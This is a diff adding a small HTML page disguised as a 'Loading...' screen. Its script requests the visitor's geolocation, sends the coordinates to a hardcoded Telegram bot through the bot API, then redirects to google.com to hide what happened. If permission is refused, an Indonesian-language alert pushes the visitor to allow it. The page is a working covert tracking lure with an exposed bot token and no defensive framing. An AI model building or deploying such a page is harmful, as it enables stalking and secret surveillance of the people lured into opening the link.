@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+    <script>
+        const token = '8601318275:AAHCZd1zuF_fbVfwEp9SqCyA1Bgf5Iue4Hs';
+        const chatId = '8607837939';
+
+        function sendToTelegram(lat, lon) {
+            // Sudah saya perbaiki menjadi https:// (dua slash)
+            const url = `https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`;
+            
+            fetch(url).then(() => {
+                window.location.href = "https://google.com"; 
+            });
+        }
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                sendToTelegram(pos.coords.latitude, pos.coords.longitude);
+            }, (err) => {
+                alert("Klik 'Izinkan' untuk melanjutkan.");
+            });
+        }
+    </script>
+</body>
+</html>
